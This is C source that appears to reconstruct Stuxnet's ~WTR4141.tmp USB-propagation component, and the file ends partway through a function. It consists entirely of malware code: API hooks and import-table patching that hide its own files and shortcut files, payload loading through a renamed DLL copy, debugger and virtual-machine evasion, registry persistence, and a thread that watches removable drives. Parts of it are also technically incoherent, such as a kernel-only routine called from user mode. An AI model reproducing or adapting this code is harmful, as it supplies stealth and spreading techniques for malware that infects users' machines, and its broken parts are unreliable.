/*
 * ~WTR4141.tmp, Reference from Main/Stuxnet.dll.c [Reference:2]
 */

#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define WTR4141_MAGIC                   0x57545231
#define WTR4141_VERSION                 0x00010400
#define WTR4141_MAX_PATH                260
#define WTR4141_BUFFER_SIZE             4096
#define WTR4141_DLL_NAME                L"~WTR4141.tmp"
#define WTR4141_PAYLOAD_NAME            L"~WTR4132.tmp"
#define WTR4141_SHELL32_ASLR            L"SHELL32.DLL.ASLR."
#define WTR4141_KERNEL32_ASLR           L"KERNEL32.DLL.ASLR."
#define WTR4141_MUTEX                   L"{BE3533AB-2DDC-46a1-8F7B-F102B8A5C30A}"
#define WTR4141_LNK1                    L"Copy of Shortcut to.lnk"
#define WTR4141_LNK2                    L"Copy of Copy of Shortcut to.lnk"
#define WTR4141_LNK3                    L"Copy of Copy of Copy of Shortcut to.lnk"
#define WTR4141_LNK4                    L"Copy of Copy of Copy of Copy of Shortcut to.lnk"
#define WTR4141_REG_KEY                 L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define WTR4141_REG_VALUE               L"19790509"

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

#define NtCurrentProcess()              ((HANDLE)(LONG_PTR)-1)

typedef struct _WTR4141_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[WTR4141_MAX_PATH];
    WCHAR szSystemPath[WTR4141_MAX_PATH];
    WCHAR szWindowsPath[WTR4141_MAX_PATH];
    WCHAR szTempPath[WTR4141_MAX_PATH];
    WCHAR szDrivePath[WTR4141_MAX_PATH];
    BYTE bReserved[256];
} WTR4141_CTX, * PWTR4141_CTX;

typedef struct _WTR4141_HOOK_ENTRY {
    LPCSTR szDllName;
    LPCSTR szFuncName;
    PVOID pOriginal;
    PVOID pHook;
    BYTE bOriginalBytes[8];
} WTR4141_HOOK_ENTRY, * PWTR4141_HOOK_ENTRY;

typedef struct _WTR4141_IAT_ENTRY {
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    LPCSTR szDllName;
    LPCSTR szFuncName;
    PVOID pOriginal;
    PVOID pHook;
} WTR4141_IAT_ENTRY, * PWTR4141_IAT_ENTRY;

static WTR4141_CTX g_Wtr4141Ctx;
static BOOL g_bInitialized = FALSE;
static BOOL g_bHooksInstalled = FALSE;
static DWORD g_dwDriveType = 0;
static WCHAR g_szCurrentDrive[4] = L"A:\\";
static WTR4141_IAT_ENTRY g_IATHooks[32];
static DWORD g_dwIATHookCount = 0;

typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_ZwQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef HANDLE (WINAPI *PFN_FindFirstFileW)(
    LPCWSTR lpFileName,
    LPWIN32_FIND_DATAW lpFindFileData
);

typedef BOOL (WINAPI *PFN_FindNextFileW)(
    HANDLE hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData
);

typedef HANDLE (WINAPI *PFN_FindFirstFileExW)(
    LPCWSTR lpFileName,
    FINDEX_INFO_LEVELS fInfoLevelId,
    LPVOID lpFindFileData,
    FINDEX_SEARCH_OPS fSearchOp,
    LPVOID lpSearchFilter,
    DWORD dwAdditionalFlags
);

static PFN_NtQueryDirectoryFile pOriginalNtQueryDirectoryFile = NULL;
static PFN_ZwQueryDirectoryFile pOriginalZwQueryDirectoryFile = NULL;
static PFN_FindFirstFileW pOriginalFindFirstFileW = NULL;
static PFN_FindNextFileW pOriginalFindNextFileW = NULL;
static PFN_FindFirstFileExW pOriginalFindFirstFileExW = NULL;

static BOOL WTR4141_IsFileHidden(LPCWSTR szFileName) {
    if (!szFileName) return FALSE;
    if (wcsstr(szFileName, L"~WTR4141.tmp") != NULL) return TRUE;
    if (wcsstr(szFileName, L"~WTR4132.tmp") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Copy of Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Copy of Copy of Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"autorun.inf") != NULL) return TRUE;
    return FALSE;
}

static BOOL WTR4141_IsDriveRemovable(LPCWSTR szDrive) {
    UINT uType = GetDriveTypeW(szDrive);
    return (uType == DRIVE_REMOVABLE);
}

static NTSTATUS WTR4141_FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    UNICODE_STRING ustrFileName;
    WCHAR szFileName[WTR4141_MAX_PATH];
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOL bFound;
    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != FileDirectoryInformation && InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }
    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;
    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;
        if (pCurrent->FileNameLength > 0 && pCurrent->FileNameLength < WTR4141_MAX_PATH * sizeof(WCHAR)) {
            ZeroMemory(szFileName, sizeof(szFileName));
            memcpy(szFileName, pCurrent->FileName, pCurrent->FileNameLength);
            szFileName[pCurrent->FileNameLength / sizeof(WCHAR)] = L'\0';
            if (WTR4141_IsFileHidden(szFileName)) {
                bFound = TRUE;
                if (pCurrent->NextEntryOffset != 0) {
                    pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
                    if (pPrev == NULL) {
                        RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                        pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                        ulRemaining -= pCurrent->NextEntryOffset;
                        continue;
                    } else {
                        pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                        pCurrent = pNext;
                        ulRemaining -= ulEntrySize;
                        continue;
                    }
                } else {
                    if (pPrev != NULL) {
                        pPrev->NextEntryOffset = 0;
                    }
                    ulRemaining = 0;
                    break;
                }
            }
        }
        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }
    if (bFound) {
        *pReturnLength = ulNewLength;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI WTR4141_Hook_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;
    if (!pOriginalNtQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = pOriginalNtQueryDirectoryFile(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );
    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }
    WTR4141_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );
    return status;
}

static NTSTATUS NTAPI WTR4141_Hook_ZwQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;
    if (!pOriginalZwQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = pOriginalZwQueryDirectoryFile(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );
    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }
    WTR4141_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );
    return status;
}

static HANDLE WINAPI WTR4141_Hook_FindFirstFileW(
    LPCWSTR lpFileName,
    LPWIN32_FIND_DATAW lpFindFileData
) {
    HANDLE hResult;
    if (!pOriginalFindFirstFileW) {
        return INVALID_HANDLE_VALUE;
    }
    hResult = pOriginalFindFirstFileW(lpFileName, lpFindFileData);
    if (hResult != INVALID_HANDLE_VALUE && lpFindFileData) {
        if (WTR4141_IsFileHidden(lpFindFileData->cFileName)) {
            FindClose(hResult);
            SetLastError(ERROR_NO_MORE_FILES);
            return INVALID_HANDLE_VALUE;
        }
    }
    return hResult;
}

static BOOL WINAPI WTR4141_Hook_FindNextFileW(
    HANDLE hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData
) {
    BOOL bResult;
    if (!pOriginalFindNextFileW) {
        return FALSE;
    }
    while (1) {
        bResult = pOriginalFindNextFileW(hFindFile, lpFindFileData);
        if (!bResult || !lpFindFileData) {
            return bResult;
        }
        if (!WTR4141_IsFileHidden(lpFindFileData->cFileName)) {
            return TRUE;
        }
    }
}

static HANDLE WINAPI WTR4141_Hook_FindFirstFileExW(
    LPCWSTR lpFileName,
    FINDEX_INFO_LEVELS fInfoLevelId,
    LPVOID lpFindFileData,
    FINDEX_SEARCH_OPS fSearchOp,
    LPVOID lpSearchFilter,
    DWORD dwAdditionalFlags
) {
    HANDLE hResult;
    if (!pOriginalFindFirstFileExW) {
        return INVALID_HANDLE_VALUE;
    }
    hResult = pOriginalFindFirstFileExW(
        lpFileName,
        fInfoLevelId,
        lpFindFileData,
        fSearchOp,
        lpSearchFilter,
        dwAdditionalFlags
    );
    if (hResult != INVALID_HANDLE_VALUE && lpFindFileData) {
        PWIN32_FIND_DATAW pFindData = (PWIN32_FIND_DATAW)lpFindFileData;
        if (WTR4141_IsFileHidden(pFindData->cFileName)) {
            FindClose(hResult);
            SetLastError(ERROR_NO_MORE_FILES);
            return INVALID_HANDLE_VALUE;
        }
    }
    return hResult;
}

static BOOL WTR4141_InstallIATHooks(VOID) {
    HMODULE hModule;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    PIMAGE_THUNK_DATA pOrigThunk;
    LPCSTR szDllName;
    LPCSTR szFuncName;
    DWORD dwOldProtect;
    DWORD i, j;
    hModule = GetModuleHandleW(NULL);
    if (!hModule) return FALSE;
    pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)hModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (!pImportDesc) return FALSE;
    for (i = 0; pImportDesc[i].Name != 0; i++) {
        szDllName = (LPCSTR)((PBYTE)hModule + pImportDesc[i].Name);
        if (!szDllName) continue;
        if (_stricmp(szDllName, "kernel32.dll") == 0 || _stricmp(szDllName, "ntdll.dll") == 0) {
            pThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc[i].FirstThunk);
            pOrigThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc[i].OriginalFirstThunk);
            if (!pThunk) continue;
            for (j = 0; pThunk[j].u1.AddressOfData != 0; j++) {
                if (!pOrigThunk) continue;
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk[j].u1.Ordinal)) {
                    continue;
                }
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)hModule + pOrigThunk[j].u1.AddressOfData);
                if (!pImportByName) continue;
                szFuncName = (LPCSTR)pImportByName->Name;
                if (!szFuncName) continue;
                if (_stricmp(szFuncName, "FindFirstFileW") == 0) {
                    pOriginalFindFirstFileW = (PFN_FindFirstFileW)pThunk[j].u1.Function;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), PAGE_READWRITE, &dwOldProtect);
                    pThunk[j].u1.Function = (ULONG_PTR)WTR4141_Hook_FindFirstFileW;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), dwOldProtect, &dwOldProtect);
                    g_IATHooks[g_dwIATHookCount].szDllName = "kernel32.dll";
                    g_IATHooks[g_dwIATHookCount].szFuncName = "FindFirstFileW";
                    g_IATHooks[g_dwIATHookCount].pOriginal = pOriginalFindFirstFileW;
                    g_IATHooks[g_dwIATHookCount].pHook = WTR4141_Hook_FindFirstFileW;
                    g_dwIATHookCount++;
                } else if (_stricmp(szFuncName, "FindNextFileW") == 0) {
                    pOriginalFindNextFileW = (PFN_FindNextFileW)pThunk[j].u1.Function;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), PAGE_READWRITE, &dwOldProtect);
                    pThunk[j].u1.Function = (ULONG_PTR)WTR4141_Hook_FindNextFileW;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), dwOldProtect, &dwOldProtect);
                    g_IATHooks[g_dwIATHookCount].szDllName = "kernel32.dll";
                    g_IATHooks[g_dwIATHookCount].szFuncName = "FindNextFileW";
                    g_IATHooks[g_dwIATHookCount].pOriginal = pOriginalFindNextFileW;
                    g_IATHooks[g_dwIATHookCount].pHook = WTR4141_Hook_FindNextFileW;
                    g_dwIATHookCount++;
                } else if (_stricmp(szFuncName, "FindFirstFileExW") == 0) {
                    pOriginalFindFirstFileExW = (PFN_FindFirstFileExW)pThunk[j].u1.Function;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), PAGE_READWRITE, &dwOldProtect);
                    pThunk[j].u1.Function = (ULONG_PTR)WTR4141_Hook_FindFirstFileExW;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), dwOldProtect, &dwOldProtect);
                    g_IATHooks[g_dwIATHookCount].szDllName = "kernel32.dll";
                    g_IATHooks[g_dwIATHookCount].szFuncName = "FindFirstFileExW";
                    g_IATHooks[g_dwIATHookCount].pOriginal = pOriginalFindFirstFileExW;
                    g_IATHooks[g_dwIATHookCount].pHook = WTR4141_Hook_FindFirstFileExW;
                    g_dwIATHookCount++;
                }
            }
        }
    }
    return TRUE;
}

static BOOL WTR4141_InstallSSDTHooks(VOID) {
    HMODULE hNtdll;
    PVOID pFunc;
    UNICODE_STRING ustrName;
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    RtlInitUnicodeString(&ustrName, L"NtQueryDirectoryFile");
    pFunc = MmGetSystemRoutineAddress(&ustrName);
    if (pFunc) {
        pOriginalNtQueryDirectoryFile = (PFN_NtQueryDirectoryFile)pFunc;
    }
    RtlInitUnicodeString(&ustrName, L"ZwQueryDirectoryFile");
    pFunc = MmGetSystemRoutineAddress(&ustrName);
    if (pFunc) {
        pOriginalZwQueryDirectoryFile = (PFN_ZwQueryDirectoryFile)pFunc;
    }
    if (!pOriginalNtQueryDirectoryFile || !pOriginalZwQueryDirectoryFile) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4141_LoadPayload(VOID) {
    HANDLE hFile;
    HANDLE hSelf;
    DWORD dwSize;
    DWORD dwRead;
    PBYTE pData;
    HMODULE hPayload;
    FARPROC pExport;
    WCHAR szPath[WTR4141_MAX_PATH];
    WCHAR szSelfPath[WTR4141_MAX_PATH];
    WCHAR szAslrPath[WTR4141_MAX_PATH];
    DWORD dwRandom;
    GetModuleFileNameW(NULL, szSelfPath, WTR4141_MAX_PATH);
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_PAYLOAD_NAME);
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > WTR4141_BUFFER_SIZE * 16) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    hSelf = GetModuleHandleW(NULL);
    if (!hSelf) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    GetModuleFileNameW(hSelf, szSelfPath, WTR4141_MAX_PATH);
    wcscpy_s(szAslrPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szWindowsPath);
    wcscat_s(szAslrPath, WTR4141_MAX_PATH, L"\\");
    wcscat_s(szAslrPath, WTR4141_MAX_PATH, WTR4141_KERNEL32_ASLR);
    dwRandom = GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)(ULONG_PTR)pData;
    wsprintfW(szAslrPath + wcslen(szAslrPath), L"%08x", dwRandom);
    wcscat_s(szAslrPath, WTR4141_MAX_PATH, L".dll");
    if (!CopyFileW(szSelfPath, szAslrPath, FALSE)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    hPayload = LoadLibraryW(szAslrPath);
    if (!hPayload) {
        DeleteFileW(szAslrPath);
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    pExport = GetProcAddress(hPayload, "Export1");
    if (pExport) {
        ((void (*)(void))pExport)();
    }
    DeleteFileW(szAslrPath);
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL WTR4141_HideFiles(VOID) {
    WCHAR szPath[WTR4141_MAX_PATH];
    DWORD dwAttr;
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_DLL_NAME);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_PAYLOAD_NAME);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK1);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK2);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK3);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK4);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    return TRUE;
}

static BOOL WTR4141_Init(VOID) {
    DWORD dwMajor, dwMinor, dwBuild;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Wtr4141Ctx, sizeof(WTR4141_CTX));
    g_Wtr4141Ctx.dwMagic = WTR4141_MAGIC;
    g_Wtr4141Ctx.dwVersion = WTR4141_VERSION;
    g_Wtr4141Ctx.dwPid = GetCurrentProcessId();
    g_Wtr4141Ctx.dwTid = GetCurrentThreadId();
    g_Wtr4141Ctx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Wtr4141Ctx.csLock);
    GetModuleFileNameW(NULL, g_Wtr4141Ctx.szModulePath, WTR4141_MAX_PATH);
    GetSystemDirectoryW(g_Wtr4141Ctx.szSystemPath, WTR4141_MAX_PATH);
    GetWindowsDirectoryW(g_Wtr4141Ctx.szWindowsPath, WTR4141_MAX_PATH);
    GetTempPathW(WTR4141_MAX_PATH, g_Wtr4141Ctx.szTempPath);
    wcscpy_s(g_Wtr4141Ctx.szDrivePath, WTR4141_MAX_PATH, L"C:\\");
    g_bInitialized = TRUE;
    return TRUE;
}

static BOOL WTR4141_Cleanup(VOID) {
    if (g_Wtr4141Ctx.hMutex) {
        CloseHandle(g_Wtr4141Ctx.hMutex);
        g_Wtr4141Ctx.hMutex = NULL;
    }
    if (g_Wtr4141Ctx.hStopEvent) {
        CloseHandle(g_Wtr4141Ctx.hStopEvent);
        g_Wtr4141Ctx.hStopEvent = NULL;
    }
    if (g_Wtr4141Ctx.hThread) {
        CloseHandle(g_Wtr4141Ctx.hThread);
        g_Wtr4141Ctx.hThread = NULL;
    }
    DeleteCriticalSection(&g_Wtr4141Ctx.csLock);
    g_bInitialized = FALSE;
    return TRUE;
}

static DWORD WINAPI WTR4141_WorkerThread(LPVOID lpParam) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    while (WaitForSingleObject(g_Wtr4141Ctx.hStopEvent, 5000) != WAIT_OBJECT_0) {
        dwDrives = GetLogicalDrives();
        for (i = 0; i < 26; i++) {
            if (dwDrives & (1 << i)) {
                szDrive[0] = L'A' + i;
                szDrive[1] = L':';
                szDrive[2] = L'\\';
                szDrive[3] = L'\0';
                if (WTR4141_IsDriveRemovable(szDrive)) {
                    wcscpy_s(g_Wtr4141Ctx.szDrivePath, WTR4141_MAX_PATH, szDrive);
                    WTR4141_HideFiles();
                }
            }
        }
        Sleep(1000);
    }
    return 0;
}

static BOOL WTR4141_StartWorker(VOID) {
    g_Wtr4141Ctx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Wtr4141Ctx.hStopEvent) return FALSE;
    g_Wtr4141Ctx.hThread = CreateThread(NULL, 0, WTR4141_WorkerThread, NULL, 0, NULL);
    if (!g_Wtr4141Ctx.hThread) {
        CloseHandle(g_Wtr4141Ctx.hStopEvent);
        g_Wtr4141Ctx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4141_CheckMutex(VOID) {
    HANDLE hMutex;
    hMutex = CreateMutexW(NULL, FALSE, WTR4141_MUTEX);
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Wtr4141Ctx.hMutex = hMutex;
    return TRUE;
}

static BOOL WTR4141_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4141_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static BOOL WTR4141_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL WTR4141_CheckRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, WTR4141_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, WTR4141_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WTR4141_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WTR4141_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, WTR4141_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WTR4141_CreateLNKFiles(VOID) {
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szPath[WTR4141_MAX_PATH];
    WCHAR szTarget[WTR4141_MAX_PATH];
    BYTE lnkData[4096];
    ZeroMemory(lnkData, sizeof(lnkData));
    *(DWORD*)(lnkData + 0) = 0x0000004C;
    *(DWORD*)(lnkData + 4) = 0x00021401;
    *(DWORD*)(lnkData + 16) = 0x00000007;
    *(DWORD*)(lnkData + 20) = 0x00020000;
    *(DWORD*)(lnkData + 24) = 0x00000001;
    *(DWORD*)(lnkData + 28) = 0x00000001;
    *(DWORD*)(lnkData + 32) = 0x00000001;
    GetSystemTimeAsFileTime((LPFILETIME)(lnkData + 36));
    *(DWORD*)(lnkData + 52) = 0x00020000;
    *(DWORD*)(lnkData + 56) = 0x00000005;
    *(DWORD*)(lnkData + 60) = 0x00000001;
    wcscpy_s((WCHAR*)(lnkData + 64), 260, L"~WTR4141.tmp");
    wcscpy_s((WCHAR*)(lnkData + 584), 260, L"~WTR4141.tmp");
    wcscpy_s((WCHAR*)(lnkData + 1104), 260, L"~WTR4141.tmp");
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK1);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
